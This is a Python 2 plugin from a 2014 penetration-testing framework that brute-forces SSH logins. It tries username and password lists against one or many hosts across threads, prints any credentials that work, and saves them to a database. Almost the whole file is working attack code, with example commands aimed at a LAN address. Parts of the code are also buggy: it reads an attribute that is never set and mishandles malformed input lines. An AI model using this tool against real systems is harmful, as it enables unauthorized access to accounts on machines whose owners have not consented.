#!/usr/bin/env python2

# Copyright (c) 2014, curesec GmbH
# All rights reserved.
#
# Redistribution and use in source and binary forms, with or without modification,
# are permitted provided that the following conditions are met:
#
# 1. Redistributions of source code must retain the above copyright notice, this list of
# conditions and the following disclaimer.
#
# 2. Redistributions in binary form must reproduce the above copyright notice, this list
# of conditions and the following disclaimer in the documentation and/or other materials
# provided with the distribution.
#
# 3. Neither the name of the copyright holder nor the names of its contributors may be used
# to endorse or promote products derived from this software without specific prior written
# permission.
#
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS
# OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
# MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
# COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
# EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
# SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
# HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
# TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
# EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
from __future__ import with_statement
import sys
import threading
import argparse
import __builtin__
import itertools as it
from datetime import datetime
from ctools.sshlib import sshClass
from ctools import cTuples
import logging
import socket
from ctools import cUtil

import ccdClasses as ccd


(NO_USER, SSH_EXCP, UNKNOWN) = range(3)

__version__ = '0.4'
__author__ = 'feli'
__plgname__ = 'ssh_bruteforce'


# logging
LOG = "/tmp/" + __plgname__ + ".log"
FORMAT = '%(asctime)s - %(name)s - ' + \
    '%(levelname)s - %(threadName)s - %(message)s'
logging.basicConfig(filename=LOG,
                    filemode="w",
                    format=FORMAT,
                    level=logging.DEBUG)

logger = logging.getLogger(__name__)
logger.setLevel(logging.DEBUG)


def brute(target, user, passw):
    logger.info('Trying %s/%s on %s', user, passw, target)

    ustr = user + '/' + target[0] + ':' + str(target[1])
    if ustr in brute.inv_users:
        logger.info('found %s in inv users' % ustr)
        raise StopIteration

    ssh = sshClass()
    ssh.method = 'password'
    ssh.user = user
    ssh.password = passw
    if brute.ssh_versions:
        ssh.ssh_version = brute.version
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect(target)
        ssh.s = sock
        ssh.createSSH()
        r = ssh.authSSH()
        if r == sshClass.LOGIN_SUCCESSFUL:
            with brute.lock:
                logger.info('adding %s to inv users' % ustr)
                brute.inv_users.append(ustr)
            yield (user, passw, target)
    except Exception, e:
        logger.exception(e)

    logger.info('Trying %s/%s on %s done', user, passw, target)
    raise StopIteration


brute.inv_users = []
brute.lock = threading.Lock()


class SshBruteforce():
    def __init__(self,
                 args,
                 dbhandler=None):
        """ Initialise SSH Bruteforcer.

            rmt_logger: remote logger to replace local logger
            dbhandler: handler to store data persistently (e.g. via ccd)
            dbglevel: debug level
        """
        logger.debug("Initialising SSH bruteforcer...")
        self.dbhandler = dbhandler

        opt = parse(args)
        if opt.which == 'host':
            self.doHost(opt)
        if opt.which == 'uph':
            self.doUph(opt)

    def doUph(self, opt):
        """ start bruteforce with uph list (multiple hosts)

            fuph: uph list file name
            ssh_verisons: list of ssh client version strings
            nthreads: number of threads
        """

        def prep_uph(line):
            if not line:
                return None
            line = line.strip()
            parts = line.split(':')
            if len(parts) == 3:
                user, password, host = parts
                port = 22
            elif len(parts) == 4:
                user, password, host, port = parts
            else:
                print 'Error: Invalid uph format: %s' % line
            r = ((host, int(port)), user, password)
            logger.info(r)
            return r

        try:
            ig_targets = cTuples.cInputGenerator(data=[],
                                                 filename=opt.uph_lists,
                                                 circle=False,
                                                 prepare_cb=prep_uph
                                                 )
        except cTuples.ENoInput:
            print 'Error: No Targets specified, please use the -t/T parameter to set target(s)'
            sys.exit(1)

        ig_targets.start()
        self.tuples = cTuples.cTuples(inputs=[ig_targets], prep_callback=brute, single=False, delay=opt.delay)
        self.tuples.start()

    def doHost(self, opt):
        """ start bruteforce with password and user list (one host)

            tHost: Host to attack tuple(host, port)
            fusers: user list file name
            fpasswords: password list file name
            ssh_verisons: list of ssh client version strings
            nthreads: number of threads
        """

        try:
            ig_targets = cTuples.cInputGenerator(data=opt.targets,
                                                 filename=opt.target_fn,
                                                 circle=False,
                                                 expand_cb=lambda t: cUtil.mkIP2(t,
                                                                                 ports=[opt.port],
                                                                                 noResolve=True
                                                                                 ),
                                                 )
        except cTuples.ENoInput:
            print 'Error: No Targets specified, please use the -t/T parameter to set target(s)'
            sys.exit(1)

        try:
            ig_users = cTuples.cInputGenerator(data=opt.users,
                                               filename=opt.user_fn,
                                               prepare_cb=lambda t: t.strip(),
                                               circle=True)
        except cTuples.ENoInput:
            print 'Error: No Usernames specified, please use the -u/U parameter to set usernames(s)'
            sys.exit(1)

        try:
            ig_passw = cTuples.cInputGenerator(data=opt.passw,
                                               filename=opt.passw_fn,
                                               prepare_cb=lambda t: t.strip(),
                                               circle=True)
        except cTuples.ENoInput:
            print 'Error: No Passwords specified, please use the -p/P parameter to set password(s)'
            sys.exit(1)

        ig_targets.start()
        ig_users.start()
        ig_passw.start()
        self.tuples = cTuples.cTuples(inputs=[ig_targets, ig_users, ig_passw], prep_callback=brute)
        self.tuples.start()

    def start(self):

        """ Do the thing """

        start_time = datetime.now()

        row_fmt = "{:30}{:30}{:}"
        for username, password, target in self.tuples.tuple_q:
            print row_fmt.format(password, username, target[0] + ':' + str(target[1]), '')
            if self.dbhandler:
                host, port = target
                ip = ''
                fqdn = ''
                typ = cUtil.getTargetType(host)
                if typ == cUtil.TTYPE.IP:
                    ip = host
                if typ == cUtil.TTYPE.DOMAIN:
                    fqdn = host
                br = ccd.BruteforceResult(
                    ip=ip,
                    fqdn=fqdn,
                    port=int(port),
                    username=username,
                    password=password,
                    service='ssh',
                )
                #br = ccd.SshBruteforceResult(
                #    host=target[0],
                #    port=int(target[1]),
                #    user=username,
                #    password=password,
                #)
                self.dbhandler.add(br)

        self.tuples.join()
        print("\nfinished in %fs" % cUtil.secs(start_time))


def parse(args):
    # parse cmd line options
    parser = argparse.ArgumentParser(
        prog=__plgname__,
        description="""Bruteforce ssh logins""",
        epilog="""Examples:
        ssh_bruteforce.plg -v vstrings.txt host -t 192.168.1.136 -U users.txt -P pass.txt
        ssh_bruteforce.plg -v vstrings.txt -nt 100 uph -B uph_file.txt""",
        formatter_class=argparse.RawTextHelpFormatter
    )  # TODO

    parser.add_argument('-nt',
                        dest='nthreads',
                        type=int,
                        default=2,
                        help='threads ex: -nt 20')
    parser.add_argument('-v',
                        dest='ssh_versions',
                        help='SSH version file ex: -v versions.txt')
    parser.add_argument('-delay',
                        help='delay in between requests',
                        dest='delay',
                        default=0.0,
                        type=float
                        )

    subparsers = parser.add_subparsers()

    # host sub program, for single host bruteforcing
    parser_host = subparsers.add_parser('host', help='single host')
    parser_host.add_argument('-T',
                             help='files containing host:port entries',
                             default='',
                             dest='target_fn'
                             )
    parser_host.add_argument('-t',
                             help='target hosts',
                             default=[],
                             nargs='+',
                             dest='targets',
                             )
    parser_host.add_argument('-port',
                             help='target port (default 22)',
                             dest='port',
                             default=22,
                             type=int
                             )
    parser_host.add_argument('-u',
                             help='usernames',
                             default=[],
                             nargs='+',
                             dest='users',
                             )
    parser_host.add_argument('-p',
                             help='passwords',
                             default=[],
                             nargs='+',
                             dest='passw',
                             )
    parser_host.add_argument('-U',
                             help='file containing one username per line',
                             default='',
                             dest='user_fn',
                             )
    parser_host.add_argument('-P',
                             help='file containing one password per line',
                             default='',
                             dest='passw_fn',
                             )
    parser_host.set_defaults(which='host')

    # uph sub program, for bruteforcing multiple hosts
    parser_uph = subparsers.add_parser('uph', help='multiple hosts')
    parser_uph.add_argument('-B',
                            dest='uph_lists',
                            required=True,
                            help='bf against multiple hosts specified in a uph file of the format ' +
                            'user:password:host[:port] ex: -B uph_file.txt')
    parser_uph.set_defaults(which='uph')

    if not args:
        parser.print_help()
        print '\nSingle host mode'
        print '----------------'
        parser_host.print_help()
        print '\nMulti host mode'
        print '----------------'
        parser_uph.print_help()
        sys.exit(1)

    try:
        opt = parser.parse_args(args)
    except:
        parser.print_help()
        sys.exit(1)

    if opt.ssh_versions:
        brute.ssh_versions = it.cycle(__builtin__.openany(opt.ssh_versions).readlines())
    else:
        brute.ssh_versions = None
    return opt
